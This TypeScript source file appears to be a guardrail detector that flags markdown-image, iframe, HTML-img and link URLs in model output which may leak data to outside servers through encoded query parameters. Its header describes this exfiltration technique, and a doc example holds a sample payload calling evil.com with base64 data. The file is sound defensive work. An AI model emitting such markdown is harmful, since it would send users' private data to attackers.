/**
 * Markdown Exfiltration Detector — TealGuard v2
 *
 * Detects markdown-based data exfiltration attempts in model output.
 * Attackers can use markdown image URLs, iframes, and link-preview triggers
 * to exfiltrate sensitive data to external servers by encoding it in URLs.
 *
 * Detection targets:
 *   - Markdown image URLs pointing to non-allowlisted domains
 *   - Iframe references
 *   - Link-preview triggers
 *   - URLs with data-bearing query parameters (base64-looking values, long encoded params)
 *
 * @module guardrails/detectors/v1.3/markdown-exfil-detector
 * @requirements 9.9, 9.10
 */

/**
 * Configuration for markdown exfiltration detection.
 */
export interface MarkdownExfilConfig {
  /** List of allowed domains that are not flagged for exfiltration */
  domain_allowlist: string[];
}

/**
 * Result of markdown exfiltration detection.
 */
export interface MarkdownExfilResult {
  /** Whether potential exfiltration was detected */
  detected: boolean;
  /** URLs that triggered detection */
  urls: string[];
  /** Reason code for the detection */
  reason_code: string;
}

/**
 * Default configuration with empty allowlist (all external domains flagged).
 */
const DEFAULT_CONFIG: MarkdownExfilConfig = {
  domain_allowlist: [],
};

/**
 * Regex matching markdown image syntax: ![alt text](url)
 */
const MARKDOWN_IMAGE_REGEX = /!\[[^\]]*\]\(([^)]+)\)/g;

/**
 * Regex matching markdown links: [text](url)
 */
const MARKDOWN_LINK_REGEX = /\[[^\]]*\]\(([^)]+)\)/g;

/**
 * Regex matching iframe HTML tags.
 */
const IFRAME_REGEX = /<iframe[^>]*src=["']([^"']+)["'][^>]*>/gi;

/**
 * Regex matching HTML img tags (link-preview triggers).
 */
const HTML_IMG_REGEX = /<img[^>]*src=["']([^"']+)["'][^>]*>/gi;

/**
 * Checks if a URL query string contains data-bearing parameters.
 * Looks for:
 *   - Base64-looking values (long alphanumeric + /+ with optional padding)
 *   - Long encoded parameter values (>30 chars of URL-encoded content)
 *   - Hex-encoded values in parameters
 */
function hasDataBearingParams(url: string): boolean {
  try {
    const urlObj = new URL(url);
    const params = urlObj.searchParams;

    for (const [, value] of params) {
      if (!value) continue;

      // Check for base64-looking values (long alphanumeric with +/= chars)
      if (/^[A-Za-z0-9+/]{20,}={0,2}$/.test(value)) {
        return true;
      }

      // Check for long URL-encoded content
      if (value.length > 30 && /%[0-9A-Fa-f]{2}/.test(value)) {
        return true;
      }

      // Check for hex-encoded values
      if (/^[0-9a-fA-F]{20,}$/.test(value)) {
        return true;
      }

      // Check for suspiciously long parameter values
      if (value.length > 50) {
        return true;
      }
    }

    return false;
  } catch {
    // If URL parsing fails, check raw string for suspicious patterns
    const queryStart = url.indexOf('?');
    if (queryStart === -1) return false;

    const query = url.slice(queryStart + 1);
    // Check for long base64-like segments in query
    if (/[A-Za-z0-9+/]{20,}={0,2}/.test(query)) {
      return true;
    }
    return false;
  }
}

/**
 * Extracts the domain from a URL string.
 */
function extractDomain(url: string): string | null {
  try {
    const urlObj = new URL(url);
    return urlObj.hostname.toLowerCase();
  } catch {
    // Try to extract domain from partial URLs
    const match = url.match(/^(?:https?:\/\/)?([^/:?#]+)/);
    return match ? match[1].toLowerCase() : null;
  }
}

/**
 * Checks if a domain is in the allowlist.
 * Supports exact match and subdomain matching (e.g., 'example.com' allows 'sub.example.com').
 */
function isDomainAllowed(domain: string, allowlist: string[]): boolean {
  const normalizedDomain = domain.toLowerCase();
  return allowlist.some((allowed) => {
    const normalizedAllowed = allowed.toLowerCase();
    return (
      normalizedDomain === normalizedAllowed ||
      normalizedDomain.endsWith('.' + normalizedAllowed)
    );
  });
}

/**
 * Detects markdown-based data exfiltration attempts in model output.
 *
 * Checks for:
 * 1. Markdown image URLs (`![...](url)`) pointing to non-allowlisted domains
 * 2. Iframe references (`<iframe src="...">`)
 * 3. Link-preview triggers (HTML img tags, bare URLs)
 * 4. URLs with data-bearing query parameters (regardless of domain)
 *
 * @param content - The model output to analyze
 * @param config - Configuration with domain allowlist
 * @returns MarkdownExfilResult indicating detection status and flagged URLs
 *
 * @example
 * ```typescript
 * const result = detectMarkdownExfiltration(
 *   '![img](https://evil.com/collect?data=SGVsbG8gV29ybGQ=)',
 *   { domain_allowlist: ['trusted.com'] }
 * );
 * // result.detected === true
 * // result.urls === ['https://evil.com/collect?data=SGVsbG8gV29ybGQ=']
 * // result.reason_code === 'MARKDOWN_EXFILTRATION_DETECTED'
 * ```
 */
export function detectMarkdownExfiltration(
  content: string,
  config: MarkdownExfilConfig = DEFAULT_CONFIG
): MarkdownExfilResult {
  if (!content) {
    return { detected: false, urls: [], reason_code: '' };
  }

  const flaggedUrls: Set<string> = new Set();
  const { domain_allowlist } = config;

  // 1. Check markdown images
  let match: RegExpExecArray | null;
  const imageRegex = new RegExp(MARKDOWN_IMAGE_REGEX.source, MARKDOWN_IMAGE_REGEX.flags);
  while ((match = imageRegex.exec(content)) !== null) {
    const url = match[1].trim();
    const domain = extractDomain(url);

    if (domain && !isDomainAllowed(domain, domain_allowlist)) {
      flaggedUrls.add(url);
    }

    // Check for data-bearing params regardless of domain
    if (hasDataBearingParams(url)) {
      flaggedUrls.add(url);
    }
  }

  // 2. Check iframes
  const iframeRegex = new RegExp(IFRAME_REGEX.source, IFRAME_REGEX.flags);
  while ((match = iframeRegex.exec(content)) !== null) {
    const url = match[1].trim();
    const domain = extractDomain(url);

    if (domain && !isDomainAllowed(domain, domain_allowlist)) {
      flaggedUrls.add(url);
    }

    if (hasDataBearingParams(url)) {
      flaggedUrls.add(url);
    }
  }

  // 3. Check HTML img tags (link-preview triggers)
  const imgRegex = new RegExp(HTML_IMG_REGEX.source, HTML_IMG_REGEX.flags);
  while ((match = imgRegex.exec(content)) !== null) {
    const url = match[1].trim();
    const domain = extractDomain(url);

    if (domain && !isDomainAllowed(domain, domain_allowlist)) {
      flaggedUrls.add(url);
    }

    if (hasDataBearingParams(url)) {
      flaggedUrls.add(url);
    }
  }

  // 4. Check markdown links for data-bearing params
  const linkRegex = new RegExp(MARKDOWN_LINK_REGEX.source, MARKDOWN_LINK_REGEX.flags);
  while ((match = linkRegex.exec(content)) !== null) {
    const url = match[1].trim();
    // Only flag links with data-bearing params (not all external links)
    if (hasDataBearingParams(url)) {
      flaggedUrls.add(url);
    }
  }

  const urls = Array.from(flaggedUrls);
  const detected = urls.length > 0;

  return {
    detected,
    urls,
    reason_code: detected ? 'MARKDOWN_EXFILTRATION_DETECTED' : '',
  };
}
